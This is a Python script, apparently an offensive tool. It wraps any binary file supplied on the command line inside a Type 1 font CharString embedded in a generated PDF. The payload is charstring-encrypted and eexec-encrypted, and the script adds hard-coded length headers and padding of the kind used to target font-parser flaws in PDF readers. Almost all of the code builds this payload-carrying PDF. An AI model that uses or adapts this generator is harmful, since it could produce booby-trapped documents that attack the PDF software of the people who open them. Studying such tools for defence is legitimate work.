#!/usr/bin/env python3

import argparse
from colorama import Fore, Style
import struct

try:
	import hexdump
except ImportError:
	print("you need the hexdump module")
	exit()

class MakeMagicPDF():
	def __init__(self, stream):
		self.stream_raw = stream
		
		#print(b"Initializing with: " + self.stream_raw)
		#print(b"size_t de payload: %d" % len(self.stream_raw))
		self.c1 = 0xce6d
		self.c2 = 0x58bf
		
	def charstring_encryption(self, text):
		r = 0x10ea 

		ret = b''
		iv = b'octa'
		for c in iv + text:
			cipher = (c ^ ((r >> 8) & 0xffff)) & 0xff
			r = (((cipher + r) * (self.c1)) + self.c2) & 0xffff
			ret += bytes([cipher])

		print(f"[{Fore.BLUE}*{Style.RESET_ALL}] charstring encoder:")
		hexdump.hexdump(iv+text)
		hexdump.hexdump(ret)
		return ret

	def eexec_encryption(self, text):
		r = 0x7c74 #0xd971
		
		packet = b"""/Private begin
/CharStrings 1 begin
/.notdef """

		packet += b"%d -| " % (len(self.stream_raw) + 4)
		# packet += b"%d -| " % 125
		# packet += b"\x39\x39 -| "
		packet += text
		packet += b""" |-
end
end
mark currentfile closefile
"""

		ret = b''
		for c in packet:
			cipher = (c ^ ((r >> 8) & 0xffff)) & 0xff
			r = (((cipher + r) * (self.c1)) + self.c2) & 0xffff
			ret += bytes([cipher])
		
		# la parte esta harcodeada, contiene que esta en binario
		# y el size_t del blob por algun lado
		print(hex(len(ret)))
		ret = b"\x80\x02" + struct.pack("<L", len(ret) + 4) + b"\xA0\xB0\x0E\xD5" + ret
		print(f"[{Fore.BLUE}*{Style.RESET_ALL}] eexec encodeado:")
		hexdump.hexdump(packet)
		hexdump.hexdump(ret)
		return ret

	def wrap(self):
		blob = b"""%PDF-1.1

1 0 obj
<< /Pages 2 0 R >>
endobj

2 0 obj
<<
  /Type /Pages
  /Count 1
  /Kids [ 3 0 R ]
>>
endobj

3 0 obj
<<
  /Type /Page
  /MediaBox [0 0 612 792]
  /Contents 5 0 R
  /Parent 2 0 R
  /Resources <<
    /Font <<
      /CustomFont <<
        /Type /Font
        /Subtype /Type0
        /BaseFont /TestFont
        /Encoding /Identity-H
        /DescendantFonts [6 0 R]
      >>
    >>
  >>
>>
endobj
4 0 obj
<</Subtype /Type1/Length 1025>>stream
"""

		postscript = b"""\x80\x01\x01\x01\x00\x00%!PS-AdobeFont-1.0: Test 001.001\x0d
dict begin\x0d
/FontInfo begin\x0d
/FullName (Test) def\x0d
end\x0d
/FontType 1 def\x0d
/FontMatrix [0.001 0 0 0.001 0 0] def\x0d
/Encoding 256 array\x0d
0 1 255 {1 index exch /.notdef put} for\x0d
readonly def\x0d
currentdict end\x0d
currentfile eexec """
		
		blob += postscript
		blob += self.eexec_encryption(self.charstring_encryption(self.stream_raw))

		for i in range(512):#1025 - len(postscript) - len(self.stream_raw)):
			if i % 64 == 0 and i > 0:
				blob += b"\n"
			#import pdb;pdb.set_trace()
			blob += b'0'

		blob += b"""
cleartomark  \x80\x03
endstream
endobj
5 0 obj
<< >>
stream
BT
  /CustomFont 12 Tf
  10 780 Td
  <0000> Tj
ET
endstream
endobj
6 0 obj
<<
  /FontDescriptor <<
    /Type /FontDescriptor
    /FontName /TestFont
    /Flags 5
    /FontBBox[0 0 10 10]
    /FontFile3 4 0 R
  >>
  /Type /Font
  /Subtype /Type1
  /BaseFont /TestFont
>>
endobj
trailer
<<
  /Root 1 0 R
>>
"""
		return blob

if __name__ == "__main__":
	parser = argparse.ArgumentParser(description="Make a PDF with embedded fonts.")
	parser.add_argument("--filename", dest='filename', help="binary file to be embedded in the pdf.", required=True)
	parser.add_argument("--hexdump", action="store_true", help="display the raw file in hex.")
	parser.add_argument("--out", dest='outfile', help="the pdf file of output.", required=True)

	args = parser.parse_args()
	
	if args.filename and args.outfile:
		print(f'[{Fore.GREEN}+{Style.RESET_ALL}] abriendo el archivo binario')
		
		raw_bytes = b""
		with open(args.filename, "rb") as f:
			raw_bytes = f.read()

		if args.hexdump:
			print(f'[{Fore.GREEN}+{Style.RESET_ALL}] hexdump view:')
			hexdump.hexdump(raw_bytes)

		print(f'[{Fore.BLUE}*{Style.RESET_ALL}] haciendo archivo')
		
		pdf = MakeMagicPDF(stream = raw_bytes)
		with open(args.outfile, "wb") as salida:
			salida.write(pdf.wrap())		
